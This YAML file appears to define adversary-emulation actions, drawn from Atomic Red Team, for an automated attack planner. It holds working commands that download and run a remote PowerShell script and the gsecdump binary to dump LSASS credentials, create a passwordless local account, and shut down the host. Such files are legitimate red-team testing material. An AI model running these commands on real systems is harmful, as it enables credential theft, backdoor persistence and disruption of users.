  - uuid: art-t1003-gsecdump-lsass
    name: Gsecdump
    id:
      - T1003
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Credential Access
    technique:
      - OS Credential Dumping
    description: |
      Dumps active-session credentials from LSASS via gsecdump-v2b5 (TrueSec
      legacy tool). Uses Method 3 (fold get_prereq_command from ART): the
      action itself stages the binary from web.archive.org with SHA256
      verification if not already present, then runs `gsecdump -a`. Precondition
      is just a powershell session; no marker predicate for the binary. ART
      auto_generated_guid 96345bfc-8ae7-4b6a-80b7-223200f24ef9.
    execution:
      executor: Powershell Executor
      command: |
        if (-not (Test-Path "#{gsecdump_exe}")) {
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          $parentpath = Split-Path "#{gsecdump_exe}"
          $binpath = "$parentpath\gsecdump-v2b5.exe"
          New-Item -ItemType Directory $parentpath -Force | Out-Null
          IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
          if (Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" "#{gsecdump_bin_hash}") {
            Move-Item $binpath "#{gsecdump_exe}"
          }
        }
        & "#{gsecdump_exe}" -a
    arguments:
      executor:
        description: The Powershell session ID used to invoke the prereq + main command.
        required: true
        pddl_index: executor2_var_in_plan
      gsecdump_exe:
        default: C:\Users\Public\gsecdump.exe
        description: Local path on target where gsecdump binary should be staged and
          run.
        required: true
      gsecdump_url:
        default: 
          https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe
        description: Download URL for the gsecdump-v2b5 binary (web archive).
        required: true
      gsecdump_bin_hash:
        default: 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC
        description: Expected SHA256 of the gsecdump-v2b5.exe binary.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (credential-data ?d - data ?target - host)
      - (data-stored-c2 ?d - data)
  - uuid: art-t1136_001-new-localuser-ps
    name: Create a new user in PowerShell
    id:
      - T1136.001
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Persistence
    technique:
      - 'Create Account: Local Account'
    description: |
      PowerShell variant of local user creation: `New-LocalUser -NoPassword`
      creates a passwordless local account. Same persistence outcome as
      net user, cleaner cmdlet trail. ART auto_generated_guid
      bc8be0ac-475c-4fbf-9b1d-9fffd77afbde.
    execution:
      executor: Powershell Executor
      command: |
        New-LocalUser -Name "#{username}" -NoPassword
    arguments:
      executor:
        description: The Powershell session ID used to invoke New-LocalUser.
        required: true
        pddl_index: executor2_var_in_plan
      username:
        default: BackupSvcPs
        description: Local account name to create.
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (powershell ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (user-created ?u - user ?target - host)
  - uuid: art-t1529-shutdown
    name: Shutdown System - Windows
    id:
      - T1529
    source: Atomic Red Team
    supported_platforms:
      - windows
    tactics:
      - Impact
    technique:
      - System Shutdown/Reboot
    description: |
      Issues `shutdown /s` to power down the target after a short countdown.
      Availability impact — legitimate users lose access until the host is
      restarted. ART auto_generated_guid ad254fa8-45c0-403b-8c77-e00b3d3e7a64.
    execution:
      executor: Command Prompt Executor
      command: |
        shutdown /s /t #{timeout}
    arguments:
      executor:
        description: The Command Prompt session ID used to invoke shutdown.
        required: true
        pddl_index: executor1_var_in_plan
      timeout:
        default: 60
        description: Seconds until shutdown fires (giving the operator a window to
          abort during testing).
        required: true
    preconditions:
      - (os-windows ?target - host)
      - (command-prompt ?executorID - executor ?target - host)
      - (elevated-executor ?executorID - executor)
    effects:
      - (system-shutdown ?target - host)
